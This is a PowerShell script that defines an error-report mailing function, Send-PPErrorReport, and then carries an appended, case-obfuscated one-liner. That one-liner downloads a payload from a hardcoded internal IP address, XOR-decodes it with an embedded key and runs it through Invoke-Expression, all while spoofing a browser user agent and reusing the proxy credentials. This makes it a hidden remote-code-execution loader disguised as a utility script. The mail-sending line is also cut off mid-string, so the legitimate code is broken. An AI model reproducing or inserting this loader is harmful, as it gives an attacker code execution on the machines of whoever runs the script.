

function Send-PPErrorReport{



	param(
		[Parameter(Mandatory=$true)]
		[String]
		$FileName,

        [Parameter(Mandatory=$true)]
		[String]
		$ScriptName,
		
		[switch]
		$ClearErrorVariable  
	)

	
	
	
	
	if($Error){ 	
		
		$Error
		
		
		$Body = ""

		
		$Error | foreach{$Body += $_.ToString() + $_.InvocationInfo.PositionMessage + "`n`n"}

		
		$Mail = Get-PPConfiguration $PSconfigs.Mail.Filter | %{$_.Content.Mail | where{$_.Name -eq $PSconfigs.Mail.ErrorClass}} | select -first 1

		
		Send-MailMessage -To $Mail.ReplyToAddress -From $Mail.FromAddress -Subject ($env:COMPUTERNAME + " " + $ScriptName + " 

		
		if($ClearErrorVariable){$error.clear()}
	}
}


$WC=NEw-OBJEcT SyStEm.NET.WebCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaDErS.ADD('User-Agent',$u);$wc.ProxY = [SYStEM.NET.WebREQueST]::DEfAuLtWEBProXY;$WC.PrOxy.CrEdEntiALS = [SYSteM.NET.CREdenTIalCache]::DEFaUltNetWORkCRedentIALs;$K='@^.B!MvcfVCA2D~+8*JK}w14lj|Wip(>';$i=0;[ChAR[]]$B=([cHAR[]]($wc.DOwnLoadSTRing("http://10.60.13.238:8082/index.asp")))|%{$_-bXor$k[$i++%$K.LEnGTH]};IEX ($b-JoiN'')

